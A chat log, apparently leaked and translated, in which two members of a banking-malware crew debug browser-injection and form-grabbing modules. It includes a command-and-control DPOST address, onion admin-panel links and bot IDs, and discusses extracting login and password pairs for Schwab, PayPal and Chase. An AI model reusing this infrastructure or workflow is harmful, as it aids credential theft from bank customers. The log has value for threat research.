+[14.09.21 11:35:47] hammer: let me write to garfield, he should have access to black, he'll restart the module
+[14.09.21 11:36:09] hammer: or Eugene
+[14.09.21 11:45:29] hammer: that's tinjectDll's name, right?
+[14.09.21 11:45:40] hammer: tinjectDll
+test
+only x64
+battle one did not get a new one
+[14.09.21 11:45:45] hammer: tsesar answered that
+[14.09.21 11:46:27] hammer: did eugene not write?
+[14.09.21 11:47:34] jaime: Yeah, that's right. I'm building a new module right now. I have bot IP and vnc access.
+[14.09.21 11:52:55] hammer: so did eugene write it?
+[14.09.21 11:53:16] hammer: he can find the IP and restart
+[14.09.21 11:57:07] hammer: okay. i sent garfield to you.
+[14.09.21 11:57:53] hammer: tell him when he uploads the fresh module and ipi, so he can find the bot by it
+[14.09.21 11:58:13] hammer: I texted him the module name
+[14.09.21 12:00:59] jaime: Yep.
+[14.09.21 12:02:05] hammer: okay
+[14.09.21 13:13:34] hammer: is it working?
+[14.09.21 13:43:36] jaime: let's see.
+[14.09.21 15:51:33] jaime: We uploaded to 3 machines from Robin new module. On them began to open. For now, we will look at it in test mode, dotting the cars from Robin.
+[14.09.21 16:31:49] hammer: *fingers crossed everywhere
+[14.09.21 16:43:57] hammer: there, look, it could be such a thing, that the usual injector module will start again, even if it was released
+[15.09.21 13:43:06] hammer: Hey, what's new?
+[15.09.21 14:32:29] jaime: Hi. Yesterday we got zekonfied.
+[15.09.21 14:32:52] jaime: Garfield was rebooting my modules till 24 hours Moscow time.
+[15.09.21 14:33:01] jaime: Yesterday everything ended successfully
+[15.09.21 14:33:15] jaime: gave new build to Caesar today
+[15.09.21 14:55:34] hammer: waiting for news from the fields?
+[15.09.21 15:30:32] jaime: Yeah. What else can we do :)
+[16.09.21 15:54:17] hammer: Hey, what's going on in general?
+[16.09.21 16:51:47] jaime: Hi.
+[16.09.21 16:51:57] jaime: Well, I told Caesar everything yesterday.
+[16.09.21 16:52:08] jaime: We updated a couple more places last night
+[16.09.21 16:52:13] jaime: Not yet.
+[16.09.21 16:52:15] hammer: I asked him, he didn't answer, did he update or not
+[16.09.21 16:52:48] jaime: I think he did it yesterday
+[16.09.21 16:53:23] hammer: okay, waiting for happy childish laughter or gnashing of teeth from users
+[16.09.21 16:53:37] jaime: :) that's the only way to find out!
+[9/22/221 11:23:45] hammer: Hey, when you're free so I don't interrupt, write me about what's going on with the injector, and Angelo is telling gloomy stories
+[22.09.21 11:24:03] hammer: and there's a trik pr sylver calling you in the chat room
+[22.09.21 15:11:27] jaime: hi.
+[22.09.21 15:11:42] jaime: I'm just checking with Robin.
+[22.09.21 15:14:01] jaime: Checked both injections and logposts.
+[22.09.21 15:14:10] jaime: Hi.
+I'm checking all sorts of things here at Robin.
+[22.09.21 15:43:58] hammer: The first message didn't come from you.
+[22.09.21 15:44:41] hammer: angelo wrote that after the patch with privasi erro pages are broken, then they load, then they don't, including those pages that are missing in config
+[22.09.21 15:45:06] hammer: i asked him to check if it's only under vnts or without it too
+[22.09.21 15:45:29] hammer: I won't interrupt, I'll ask you later how it's going
+[22.09.21 16:16:18] jaime: Not privasi error gone. There are some problems with injections and a couple of sites.
+[22.09.21 16:16:34] jaime: I also did not understand about the logpost, all checked all goes
+[22.09.21 16:17:21] jaime: Everything is very confused, I don't understand anything anymore.
+[22.09.21 16:41:19] hammer: Not a privasi error gone.
+[22.09.21 16:41:42] hammer: you mean, "Nah," the privasi arror's gone." right?
+[22.09.21 16:41:57] hammer: the error is gone, but the pages are broken.
+[22.09.21 16:42:14] hammer: and the logpost, there are no logs from the module?
+[22.09.21 16:42:38] hammer: it might go, but it doesn't reach the repository
+[22.09.21 16:43:00] hammer: Or it doesn't get there at all, because it can't get there, there are gaskets or wrong address
+[22.09.21 16:43:27] hammer: "2021-09-09-09 12:18:55 tpwgrabblog DPST FAILED to send 'COOKIES' of 'Firefox' to servers: data not validated"
+[22.09.21 16:43:43] hammer: like this, it's an old entry from pwgrabblog
+[22.09.21 16:49:05] hammer: actually, frank is getting out of vacation on monday
+[22.09.21 16:49:47] hammer: while the matter is over, tomas will be out by then
+[22.09.21 17:14:09] jaime: Privaci eror is gone.
+[22.09.21 17:14:32] jaime: Pages are broken, but only two of them are injected
+[22.09.21 17:15:11] jaime: According to the log post it looks like this: Robin logged into history and didn't see her confirmation in the log post
+[22.09.21 17:15:35] jaime: Well I don't know what was there. I went to those sites, everything's there, everything's being sent.
+[22.09.21 17:15:59] jaime: Robin said he gave you a bunch of URLs.
+[22.09.21 17:26:29] hammer: I got the same ones you got
+[22.09.21 17:26:35] hammer: thomas got one too
+[22.09.21 17:27:13] hammer: there is no frank there, i can't run the bot.
+[22.09.21 17:27:19] jaime: I started with the debug, started browsing through the urls, I was wondering if something is really wrong
+[22.09.21 17:27:28] hammer: no access from the battle one
+[22.09.21 17:27:38] jaime: No, the data is flying
+[22.09.21 17:27:51] jaime: I have a combat bot, just a test bot
+[22.09.21 17:27:56] jaime: To see the logs
+[22.09.21 17:28:01] hammer: well, it must be a caprice from admin's side
+[22.09.21 17:28:16] jaime: Robin saw them too
+[22.09.21 17:28:29] jaime: He and I were watching online.
+[22.09.21 17:28:31] jaime: He sees
+[22.09.21 17:28:51] jaime: Data going out, reply coming in
+[22.09.21 17:29:09] jaime: I think to make statistics in module and send it to admin area
+[22.09.21 17:29:24] hammer: now it will be, "it works on your testing one, it doesn't work on combat one, because your machine is different".
+[22.09.21 17:29:35] jaime: How many DPOSTs were robbed, how many sent, how many confirmed
+[22.09.21 17:29:47] hammer: can't it be that there's a detection on the module?
+[22.09.21 17:30:03] jaime: Anything's possible
+[22.09.21 17:30:19] jaime: But it sends pings
+[22.09.21 17:30:22] hammer: the bot is intact, but the injector got eaten up
+[22.09.21 17:30:26] hammer: well, yeah
+[22.09.21 17:31:33] jaime: So it can not kill, he is part of the bot. Only together.
+[22.09.21 17:31:56] hammer: Yeah.
+[22.09.21 17:31:56] jaime: I don't know.
+[22.09.21 17:32:14] hammer: it's always better in the morning.
+[9/23/221 16:18:13] hammer: Hey.
+[9/23/221 16:43:20] hammer: *walks around the hut, occasionally tapping on the window and trying to look in, only to find silence and an inky black darkness inside the room. There are no lights. Neither is the master of the house, or he persistently shows ignorance)*.
+[9/23/221 16:43:35] hammer: come back tomorrow)
+[24.09.21 09:36:33] jaime: hi!
+[24.09.21 09:36:39] hammer: hi)
+[24.09.21 09:36:42] jaime: Noticed your message late yesterday!
+[24.09.21 09:37:06] hammer: no big deal, I had some reports on me anyway, I'm working on them now
+[24.09.21 09:37:10] hammer: you're just in time
+[24.09.21 09:37:32] jaime: Problem with pages not opening was solved
+[24.09.21 09:37:50] jaime: Yesterday if you saw the channel solved the problem with the logpost
+[24.09.21 09:38:00] hammer: no, I haven't
+[24.09.21 09:38:07] hammer: more details here, please
+[24.09.21 09:38:19] jaime: On the trick channel
+[24.09.21 09:38:26] jaime: I didn't even get it right
+[24.09.21 09:38:33] jaime: Angelo was doing tests
+[24.09.21 09:38:40] hammer: nothing there(
+[24.09.21 09:38:43] jaime: Adam and Thomas were scrambling in the logs
+[24.09.21 09:39:01] jaime: Found something with Cookie
+[24.09.21 09:39:22] jaime: I didn't get the form looter, server took everything and responded
+[24.09.21 09:39:26] jaime: Apparently everything is fine
+[24.09.21 09:40:14] hammer: okay, i'll go to tomas and angelo
+[24.09.21 09:40:48] hammer: did the end of the work week bring you that much joy?
+[24.09.21 09:42:32] jaime: Yes, yesterday was productive.
+[24.09.21 09:42:39] jaime: We got everybody together
+[24.09.21 09:42:44] jaime: see logs :)
+[24.09.21 09:43:05] jaime: Saw the log post coming in and found it in the logs
+[24.09.21 09:45:34] hammer: so it was admin side trouble after all?
+[24.09.21 09:46:53] jaime: So far it looks like that. We'll see from here. :)
+[24.09.21 09:52:10] hammer: you haven't heard any complaints about injections outside of Vnts?
+[24.09.21 10:16:44] jaime: Not today. Robin's texting me back.
+[24.09.21 10:17:06] jaime: Yesterday I got connected to a bot and it didn't get updated
+[24.09.21 10:28:15] jaime: Yesterday I had access to one bot I haven't seen logs from for a long time. Wanted to see what's up, but could not get all together.
+[29.09.21 16:21:14] hammer: Hey, what's the situation there now?
+[29.09.21 16:21:23] hammer: robin's complaining about formgrabber and cookies again
+[29.09.21 16:51:25] jaime: Hi!
+[29.09.21 16:52:20] jaime: we kinda already checked that data is coming from us
+[29.09.21 16:52:52] jaime: Thomas and Robin will take care of it now.
+[29.09.21 16:53:00] jaime: I'm always ready to check
+[30.09.21 09:32:22] hammer: Hey, what's the news tonight?
+[30.09.21 09:33:05] hammer: yesterday we ran pvgrabb, both cookies from it and browser acess come in, well, except ee
+[30.09.21 09:33:34] hammer: what do you hear from the inject module?
+[30.09.21 09:34:33] hammer: i'll write a report later, i'll need details, plot twists and stuff like that
+[30.09.21 09:42:31] jaime: Hi.
+[30.09.21 09:42:49] jaime: Not heard anything yet. Last time we tested it with Caesar.
+[30.09.21 09:44:11] jaime: That was on Monday, we just watched Schwab and Btt
+[30.09.21 09:44:54] jaime: The data came from the module, but something was not passed from admin to admin, I do not know, it was more Adam and Thomas watched
+[30.09.21 09:45:06] jaime: That was the end of it, the question was not raised anymore
+[30.09.21 09:53:02] hammer: frank is out, now it's on him again, it's not going into the vault
+[30.09.21 09:55:19] hammer: Repression is on)
+[30.09.21 10:04:45] hammer: Write back to the Generale about acceptance and humility
+[30.09.21 11:38:55] jaime: unsubscribe! :)
+[01.10.21 09:23:21] hammer: Hey, there's Silver again
+[01.10.21 09:24:10] hammer: What's new about the module? Frank is not there yet, I can not ask him about the vault, he did not say, figured out what about the income into it?
+[01.10.21 09:43:40] jaime: Hi
+[01.10.21 09:43:52] jaime: I'm trying to build pwgrab :)
+[01.10.21 09:44:03] hammer: it's nicholas module
+[01.10.21 09:44:23] jaime: I guess he's out, Silver asked me to check it
+[01.10.21 09:44:46] hammer: he's online)
+[01.10.21 09:45:31] jaime: Geez, I don't know why he asked me yesterday.
+[01.10.21 09:46:05] jaime: Nothing new on the injector yet. I didn't change anything.
+[01.10.21 09:47:46] hammer: just wasn't nicholas yesterday
+[01.10.21 09:48:18] hammer: there nicholas should probably add extended logs from module for black
+[01.10.21 09:48:28] jaime: Oh I see, well, I didn't have time to assemble anything, other people's code is dark
+[01.10.21 09:49:27] jaime: I lost time :(
+[25.10.21 09:40:17] hammer: Hi, repeat it, please, I got no message
+[25.10.21 09:54:41] jaime: Hi
+[25.10.21 09:55:14] jaime: I didn't write today. And what in the past is already forgotten.  :)
+[25.10.21 09:58:46] hammer: Yep. Gone.
+[26.10.21 16:29:01] hammer: Hey, what's new?
+[26.10.21 16:29:49] hammer: There's an unnatural silence in the trike chat room
+[26.10.21 16:37:53] jaime: Hi.
+[26.10.21 16:38:41] jaime: Yeah, silence just reading cyberpunk
+[26.10.21 16:39:20] jaime: No new yet, I have small fixes and improvements, but no one told me about any problems yet.
+[26.10.21 16:39:35] jaime: Working on related topics :)
+[29.10.21 14:49:57] hammer: Hey, what's new in the vast, promising wonders and adventures universe of inject?
+[01.11.21 10:05:56] hammer: Hi, there's a prick_pr complaint from robin on the logpost in the chat room
+[01.11.21 10:17:04] jaime: Hi.
+[01.11.21 10:17:11] jaime: Thanks. I'll take a look now.
+[11.01.21 10:41:37] jaime: How do we get passwords out there? Can we check it out? I'll try logging in, and we'll trace the chain. There's a password login among this garbage.
+[01.11.21 10:42:12] hammer: tell me bot's id
+[01.11.21 10:46:21] jaime: I need the IP of the pad, I'm sending it to me now.
+[01.11.21 10:57:15] hammer: I'm not telling you
+[01.11.21 10:57:32] hammer: not out of spite, but out of ignorance
+[01.11.21 10:57:49] jaime: I'll ask Adam now
+[01.11.21 10:58:18] hammer: I have a bot on one machine, I'll try to log in from it
+[01.11.21 10:58:41] jaime: https://www.schwab.com/
+[01.11.21 11:00:43] jaime: I think there is no POST there, it is too overloaded
+[01.11.21 11:01:09] jaime: I need to ask Frank how he gets passwords and logs from Schwab
+[01.11.21 11:01:13] hammer: queue again?
+[01.11.21 11:01:55] jaime: not queue
+[11.11.21 11:02:01] jaime: I'll show you
+[11.11.21 11:04:50] jaime: ``
+https://privnote.com/VhHVRVgj#9Fl4fvoSA
+```
+[01.11.21 11:05:03] jaime: There's a bunch of figs coming in from me
+[01.11.21 11:05:50] jaime: It has this: {"headers":[{"type": "uid", "uid": "superman"}] is my login, I know as I entered
+[01.11.21 11:06:39] jaime: and "data":{"password": "hellopiople"} this is it, the password I know what to look for as I entered
+[01.11.21 11:07:05] jaime: So how to find these surrendered among all this and understand that this is the login and password?
+[01.11.21 11:07:11] hammer: that's what they're looking for
+[01.11.21 11:07:29] hammer: it's not always clear that here's your login and password, you need to search
+[01.11.21 11:07:41] hammer: wait a minute, I can't get on the machine, I'll deal with it
+[01.11.21 11:08:04] jaime: You just need to know which url the data comes from and what are the rules of parsing.
+[01.11.21 11:08:35] jaime: Maybe something changed
+[01.11.21 11:22:54] hammer: there's maintenance work going on again
+[01.11.21 11:23:07] hammer: I'll report back when it's up and running
+[01.11.21 11:23:22] jaime: :) that's always like that :)
+[01.11.21 11:23:38] hammer: Tell me about it
+[01.11.21 11:40:28] jaime: So Adam gave me the pads
+[01.11.21 11:51:54] hammer: what browser did you use?
+[11.11.21 11:52:16] hammer: the car's up, I'll be right in.
+[01.11.21 11:57:33] jaime: I used chrome
+[01.11.21 11:57:51] jaime: I'll be connected in 20 minutes :)
+[01.11.21 12:27:14] jaime: Any group?
+[01.11.21 12:29:44] hammer: zev
+[01.11.21 12:30:18] hammer: NET: zev1
+the one he dropped.
+[01.11.21 12:30:40] hammer: I don't see any logpost from schwab
+[01.11.21 12:31:03] jaime: zev ? Write it that way?
+[01.11.21 12:31:07] hammer: I have zev 11 running
+[01.11.21 12:31:15] hammer: and number
+[01.11.21 12:31:24] hammer: you look in black?
+[01.11.21 12:32:40] jaime: I have no access to admin :)
+[01.11.21 12:32:59] jaime: I can set group and BOTIT where to throw
+[01.11.21 12:33:10] jaime: zev11 ?
+[01.11.21 12:33:48] jaime: QWERTY_W617600.EC1BBC962A404D9A8D9D8E3BCDBAD781 My BOTID
+[01.11.21 12:33:50] hammer: don't understand(
+[01.11.21 12:34:04] hammer: here's my bot USER-PC_W617600.4223304D9E60F7A4A9D9E4BBCA0D9EE
+[01.11.21 12:34:11] hammer: his group is zev11
+[01.11.21 12:34:22] jaime: Oh, okay.
+[01.11.21 12:34:36] hammer: but I use it to go to schwab, no logpost
+[01.11.21 12:35:57] jaime: And mine?
+[01.11.21 12:36:06] jaime: Do you need IP?
+[01.11.21 12:36:19] hammer: Go ahead, I'll look.
+[01.11.21 12:36:22] hammer: 2021-11-01 12:26:48.507416 injectDll PING browser
+[01.11.21 12:36:27] jaime: DPOST URI=http://195.39.233.29:443/zev11/QWERTY_W617600.EC1BBC962A404D9A8D9D8E3BCDBAD781/60/
+[01.11.21 12:36:28] hammer: ping
+[01.11.21 12:37:12] jaime: I have replies that all are accepted
+[01.11.21 12:37:57] hammer: can't find this id
+[01.11.21 12:38:31] hammer: he needs a franc
+[01.11.21 12:40:45] jaime: yeah, so we won't find anything
+[01.11.21 12:41:47] hammer: that's it, back to work
+[01.11.21 12:42:07] hammer: i'll send him the id of the car. let him see if anything happened to schwab
+[01.11.21 12:42:17] jaime: I see it's gone, but I don't know where it went
+[01.11.21 12:42:53] jaime: Let him scantach me, I'll send him a new one if anything.
+[01.11.21 13:24:57] hammer: did he write?
+[01.11.21 13:38:50] jaime: yes, we're working :)
+[01.11.21 14:07:49] jaime: here?
+[01.11.21 14:08:11] jaime: can you bot schwab visit? Frank asks.
+[01.11.21 14:14:00] hammer: i can't, i rolled back
+[01.11.21 14:14:18] jaime: Angelo asked
+[01.11.21 14:14:23] hammer: there's an asshole on machines, better not to do any maintenance(
+[01.11.21 14:14:26] jaime: He's free now
+[01.11.21 14:53:27] hammer: https://auk64p35qebertdsh576avhnswxdprft3kpmvsm5sixxof6bsbgryxqd.onion/logpost/more_ex/95331BBCB9730DBBF0BFB79A033CA1F9
+https://auk64p35qebertdsh576avhnswxdprft3kpmvsm5sixxof6bsbgryxqd.onion/logpost/more_ex/127AD69924C082DA0B0C4733FF373377
+[01.11.21 14:53:52] hammer: i looked, there's a logpost for the 27th date. the other one for the 26th
+[01.11.21 14:54:00] hammer: no ping events from the injector
+[01.11.21 14:54:18] hammer: looks like a sql
+[01.11.21 14:57:32] jaime: What's a kvwka?
+[01.11.21 14:57:54] hammer: it's black from the bottom
+[01.11.21 14:57:58] jaime: Frank got the data from me, he wants to see how the bot goes
+[01.11.21 14:58:15] hammer: remember, when the logpost wasn't running and this inject didn't restart
+[01.11.21 14:58:22] hammer: this looks like the same thing
+[01.11.21 14:58:39] hammer: because I don't see any ping events from the injector
+[01.11.21 14:58:55] hammer: well. the test ones seem to be up and running
+[01.11.21 14:59:02] jaime: Yeah, it did
+[01.11.21 14:59:05] hammer: I'm on it.
+[01.11.21 14:59:30] hammer: but the formgraber in the auction
+doesn't work
+on many bots
+2:35 PM
+examples
+2:38 PM
+yeah it's all just
+sec
+https://auk64p35qebertdsh576avhnswxdprft3kpmvsm5sixxof6bsbgryxqd.onion/logpost/more_ex/3011D0E8F7A8A55D82334A61546A77F2
+https://auk64p35qebertdsh576avhnswxdprft3kpmvsm5sixxof6bsbgryxqd.onion/logpost/more_ex/C373881522054A73BA588CA96049723C
+https://auk64p35qebertdsh576avhnswxdprft3kpmvsm5sixxof6bsbgryxqd.onion/logpost/more_ex/81533B1F33B4477F5485FD08BBC2DFBD
+https://auk64p35qebertdsh576avhnswxdprft3kpmvsm5sixxof6bsbgryxqd.onion/logpost/more_ex/96F3F7FCBBE1AB9F27B73ADB9E833B1C
+https://auk64p35qebertdsh576avhnswxdprft3kpmvsm5sixxof6bsbgryxqd.onion/logpost/more_ex/95331BBCB9730DBBF0BFB79A033CA1F9
+https://auk64p35qebertdsh576avhnswxdprft3kpmvsm5sixxof6bsbgryxqd.onion/logpost/more_ex/127AD69924C082DA0B0C4733FF373377
+maybe then as on dnog updated this point
+on the auction did not update
+[01.11.21 14:59:38] hammer: over there in the trik_pr chat
+[01.11.21 14:59:47] hammer: robin moaning
+[01.11.21 15:12:19] jaime: Yeah, I see it :)
+[01.11.21 15:12:25] jaime: What do you want from me?
+[01.11.21 15:13:58] jaime: Rocket is not convenient, a lot of groups, I see either groups or personal correspondence
+[01.11.21 15:16:50] hammer: I don't know. kick someone there)
+[01.11.21 15:28:36] hammer: too bad
+[01.11.21 15:29:06] hammer: I logged in both from ff and chrome to schwab, no logpost
+[01.11.21 15:29:16] hammer: went to paypal, same thing
+[01.11.21 15:29:27] hammer: there seems to be no logpost coming in at all
+[01.11.21 15:29:40] hammer: but there are pings
+[01.11.21 15:32:11] hammer: 2021-11-01 15:16:23.344068 injectDll PING browser 0 64
+2021-11-01 15:16:21.126279 injectDll VERS browser 0 64
+2021-11-01 15:16:15.279342 injectDll start 0 63
+[01.11.21 15:35:01]
+[01.11.21 15:35:27] hammer: I'll try now with different machine
+[01.11.21 15:35:39] hammer: I have a normal injecta plugin, not a tinject
+[01.11.21 15:35:57] jaime: Yeah, better with log
+[01.11.21 16:05:49] hammer: I logged in from another machine, also no logpost
+[01.11.21 16:06:06] hammer: put the inject on the release and started the tinject, let's see
+[01.11.21 16:06:33] hammer: but angelo says he has a tinjacket writing a log 1, but the logpost is still not working
+[01.11.21 16:06:46] jaime: yeah just wanted to write that
+[01.11.21 16:08:42] hammer: 2021-11-01 16:07:10.589862 tinjectDll PING browser 0 64
+2021-11-01 16:07:08.370697 tinjectDll VERS browser 0 64
+2021-11-01 16:07:03.787978 tinjectDll start 0 63
+[01.11.21 16:08:47] hammer: let me try
+[01.11.21 16:19:48] hammer: no way
+[01.11.21 16:20:29] hammer: reponse in log: /1/, nothing in store
+[01.11.21 16:21:41] hammer: it's from both tinkert and inject, something about storage
+[01.11.21 16:22:26] hammer: and not only from schwab. it's not coming from paypal, it's not coming from yahoo, it's not coming from anywhere
+[01.11.21 16:39:39] jaime: I see. Again machalo.:(
+[01.11.21 16:39:47] jaime: What does Frank say?
+[01.11.21 16:51:31] hammer: nothing yet
+[01.11.21 17:06:15] hammer: not talking(
+[01.11.21 17:18:30] hammer: said he's watching
+[01.11.21 17:26:28] jaime: okay
+[01.11.21 17:38:38] hammer: yeah, I think there's a logpost
+[01.11.21 17:44:36] hammer: frank didn't say anything?
+[01.11.21 17:52:22] hammer: jgfplsdftn kjugjcn
+[01.11.21 17:53:08] hammer: it's late, it's stale
+[01.11.21 17:53:25] hammer: I need to roll machines, caesar check startup
+[01.11.21 17:57:16] jaime: so does the info come in? With a delay?
+[01.11.21 17:58:02] hammer: it's not clear, the logpost is up, but I don't see everything, it either hasn't come yet or won't come yet
+[01.11.21 17:58:09] hammer: need frank's response
+[01.11.21 17:58:22] hammer: papal, for example, I don't see
+[01.11.21 17:58:31] hammer: chase too
+[01.11.21 17:59:18] jaime: not just everything
+[01.11.21 18:31:59] hammer: he didn't say anything back to you?
+[01.11.21 18:48:22] hammer: well, there's a line, but it's small
+[01.11.21 18:48:48] hammer: it's still unclear if it's in the queue or not arrived at all
+[01.11.21 18:50:06] hammer: tomorrow I will have to put bot again and check how the queue will go down
+[01.11.21 18:50:35] hammer: is it definitely not coming from schwab, or just browsing around somewhere, and is there a loginpass or a bunch of unnecessary
+[01.11.21 18:56:01] jaime: yeah ok no problem
+[01.11.21 18:58:31] jaime: Maybe until Frank finishes it don't touch it?
+[01.11.21 18:58:39] jaime: Otherwise we only distract him
+[01.11.21 18:58:56] hammer: I don't know, if Robin won't complain, no problem
+[01.11.21 18:59:05] jaime: Otherwise we all study the problem, and all go back to the same place
+[01.11.21 18:59:05] hammer: And we can look through logs without frank
+[01.11.21 18:59:10] hammer: tomas to attract
+[01.11.21 18:59:13] hammer: we'll see
+[01.11.21 19:00:01] jaime: There is something strange here, no matter what happens with the queue, after one hour the data will get through?
+[01.11.21 19:00:14] jaime: Robin doesn't need realtime.
+[01.11.21 19:00:36] hammer: well, they should, if they leave, there's a response
+[01.11.21 19:01:02] jaime: not if we can look, of course, we will, to close his theme and be sure :)
+[01.11.21 19:01:11] hammer: well, the problem is, to find the diamonds of loginpasses in a pile
+[01.11.21 19:02:05] hammer: but how to do it, it's unclear, there's almost always need to search, not often writes id or login, but a password in separate lines
+[01.11.21 19:02:26] jaime: yes, you can say so. There's only dross flying around.
+[01.11.21 19:02:41] jaime: And how much just garbage, telemetry and stuff
+[11/10/21/2011 09:08:40] hammer: Hey, what's new?
+[10.11.21 09:17:53] jaime: Hi. Nothing on the Internet yet. :)
+[10.11.21 09:18:16] jaime: Little things like rules, more for myself
+[10.11.21 09:18:23] hammer: and the rest? any new modules or builds?
+[10.11.21 09:19:48] jaime: did form grabber as an exe and a separate dll, silver said he would need it soon, maybe for the backend
+[10.11.21 09:19:58] jaime: I didn't give it to anybody yet
+[10.11.21 09:22:15] jaime: Had some fun with delivery based on Ryan's research (wsa and hta) file formats. Now looking at some appx format :)
+[11.11.21 11:41:57] hammer: hi, does injecting have any effect on browser speed?
+[11.11.21 11:42:50] hammer: Hi
+[11.11.21 11:43:20] hammer: does injecting have any effect on browser performance?
+[11.11.21 11:43:47] jaime: test
+[11.11.21 11:43:51] jaime: hi!
+[11.11.21 11:44:18] hammer: Ciphers go away
+[11.11.21 11:44:21] hammer: Oh.
+[11.11.21 11:44:35] hammer: Hi, does inject affect browser performance in any way?
+[11.11.21 11:45:04] jaime: Of course it does! :)
+[11.11.21 11:45:19] jaime: It makes it work through itself
+[11.11.21 11:45:27] hammer: in terms of performance
+[11.11.21 11:45:37] hammer: maybe slow it down drastically?
+[11.11.21 11:45:37] jaime: well it drops :)
+[11.11.21 11:45:56] jaime: Well, not sharply but it slows down
+[11.11.21 11:46:14] hammer: But not exactly to zero?)
+[11.11.21 11:46:19] jaime: There's pages unpacking, modification if needed
+[11.11.21 11:46:33] jaime: Not zero.
+[11.11.21 11:46:49] jaime: I do not notice it if I use vpn
+[11.11.21 11:47:24] hammer: ok. so not an inject
+[11.11.21 11:48:22] hammer: put the bot to check for survivability, they complained that it dies, now I go to the browsers to check the browser process graph, so the browsers are tight
+[11.11.21 11:49:13] jaime: So turn off the injector?
+[11.11.21 12:05:06] hammer: just unload the module?
+[11.11.21 12:06:05] hammer: we got it
+[11.11.21 12:06:22] hammer: I was worried about remote tools, I asked about inject just in case
+[11.11.21 12:08:44] jaime: are you okay?
+[11.11.21 12:09:06] jaime: After uploading?
+[11.11.21 12:09:07] hammer: yeah, I didn't unload
+[11.11.21 12:09:16] jaime: got it.
+[11.11.21 12:09:23] hammer: apparently, the machines themselves were kicking
+[11.11.21 12:09:27] jaime: I'm watching vnc now
+[01.12.21 15:04:49] hammer: Hi.
+[01.12.21 16:20:36] jaime: hi!
+[01.12.21 16:51:00] hammer: The same injector module is used in trike 2, no changes on it?
+[01.12.21 16:54:32] jaime: I didn't even give anyone anything or do anything!
+[01.12.21 16:54:51] jaime: Apparently everything is there without me! Apparently everything must be compatible!
+[01.12.21 17:04:27] hammer: Good.
+[01.12.21 17:04:37] hammer: no changes in the module?
+[01.12.21 17:05:14] jaime: not yet, but they will. Alik will give you a CC
+[01.12.21 17:05:37] hammer: who is alik?
+[01.12.21 17:05:46] hammer: isn't he the new team leader?
+[01.12.21 17:06:03] hammer: sylver was, but I've forgotten already
+[01.12.21 17:08:52] jaime: Yep. Studying modules.
+[01.12.21 17:09:15] jaime: He wants to optimize something there.
+[01.12.21 17:09:44] hammer: ok, i got new trike from ned, i'll race him, i need regular one too
+[01.12.21 17:10:11] hammer: does robin have any complaints?
+[01.12.21 17:10:21] jaime: That's cool, finally some action.
+[01.12.21 17:10:41] jaime: No, not at all silence, I even had thoughts if he left us.
+[01.12.21 17:10:58] hammer: and angelo says it's quiet
+[01.12.21 17:11:25] hammer: but in toad is, I think if anything, he would have removed himself from there
+[01.12.21 17:17:57] jaime: maybe he got offended for the joints?
+[01.12.21 17:18:54] hammer: anything is possible
+[01.12.21 17:19:07] hammer: I was gone a week and a half, you didn't punk him here?
+[01.12.21 17:23:46] jaime: no, I wasn't! :)
+[01/12/221 17:24:10] jaime: I used to start every morning by reading his remarks.
+[01.12.21 17:24:49] hammer: sick, maybe
+[01.12.21 17:24:55] hammer: Or on vacation
+[01.12.21 17:25:18] hammer: we would probably be notified, but you can ask sylver
+[01.12.21 17:35:49] jaime: were you on vacation or sick?
+[01.12.21 17:36:09] hammer: sick
+[01.12.21 17:37:10] jaime: Covid?
+[01.12.21 17:37:31] hammer: no)
+[01.12.21 17:38:08] hammer: that's all the fun I need)
+[01.12.21 17:38:16] hammer: were you vaccinated?
+[01.12.21 17:38:27] jaime: No, I haven't
+[01.12.21 17:38:35] jaime: And the deadline for sickness is over.
+[01.12.21 17:39:30] jaime: My kid brought some shit from school, 4 days I'm dripping snot on my keyboard :)
+[01.12.21 17:39:49] hammer: awful
+[01.12.21 17:40:09] hammer: and how come there's so much liquid, sometimes it leaks endlessly
+[01.12.21 17:41:21] hammer: and then there are yellow ones, strong, stretching and stretching)
+[01.12.21 17:41:42] hammer: but once I saw green ones, at a kid in the street, first and last time
+[01.12.21 17:54:57] hammer: i went out when i was sick
+[01.12.21 17:55:17] hammer: sitting at my computer. it just popped into my head
+[01.12.21 17:55:41] hammer: I felt weak and black in the eyes, I thought I was going to fall off the chair
+[01.12.21 17:56:09] hammer: I thought I'd go out and lie down and come back
+[01.12.21 17:56:18] hammer: shit
+[01.12.21 17:56:43] jaime: Sounds scary :(
+[01.12.21 17:56:44] hammer: go cold, bone breaking, fever
+[01.12.21 17:56:59] hammer: that's okay.)
+[01.12.21 17:57:06] hammer: unexpectedly just
+[01.12.21 17:57:29] hammer: so i had to lie down
+[01.12.21 17:58:08] jaime: At first it looked like an institute
+[01.12.21 17:58:21] hammer: It's like his blood pressure spiked.
+[01.12.21 17:58:53] hammer: weather's still crappy, don't know what
+[01.12.21 17:59:08] hammer: where's the frost, wind in your face, snowstorms?
+[01.12.21 18:01:02] jaime: There will be more! :)
+[01.12.21 18:01:10] hammer: They only promise
+[01.12.21 18:02:13] hammer: I like bad weather, howling, cold, or snow, not fine and liquid, but just flakes
+[01.12.21 18:02:27] hammer: or clear frosty sky
+[01.12.21 18:02:37] hammer: not this slush and mush
+[01.12.21 18:05:32] jaime: Slush and mush is just about the Northern Capital
+[01.12.21 18:10:28] jaime: I haven't been outside for five days, but it looks like snow, -6 somewhere.
+[01.12.21 18:12:29] hammer: Yes, there's snow, but not much
+[01.12.21 18:13:34] hammer: my tric2 doesn't want to work( wrong config maybe
+[01.12.21 18:14:20] hammer: I'm gonna have a cup of tea
+[01.12.21 18:14:51] jaime: I need cognac! :)
+[02.12.21 17:21:14] hammer: Hi.
+[02.12.21 17:22:02] hammer: the logpost is still about the inject module?
+[02.12.21 18:02:47] jaime: Hi. Nothing has changed.
+[02.12.21 18:02:52] jaime: it did
+[02.12.21 18:03:00] jaime: Any problems?
+[03.12.21 09:15:04] hammer: Hi, yes, it's not working
+[03.12.21 09:24:26] jaime: Hi
+[03.12.21 09:24:48] jaime: Frank wrote 'I'll take care of logpost, rewrite data from formgrabber by analogy'. ?
+[03.12.21 09:24:57] jaime: How about this?
+[03.12.21 09:31:55] hammer: i don't know, i messaged him yesterday to look into it, maybe something like queue again
+[03.12.21 09:32:06] hammer: he ain't here yet, so I can't ask him
+[03.12.21 09:32:09] hammer: but he's pinging
+[03.12.21 09:32:16] hammer: I'm still trying to torture
+[03.12.21 09:38:20] jaime: Do all of them stop working or just one?
+[03.12.21 09:52:08] hammer: I know I'm the only one so far
+[03.12.21 12:32:15] hammer: how do you define an inject on a page?
+[03.12.21 13:24:18] jaime: exactly an inject?
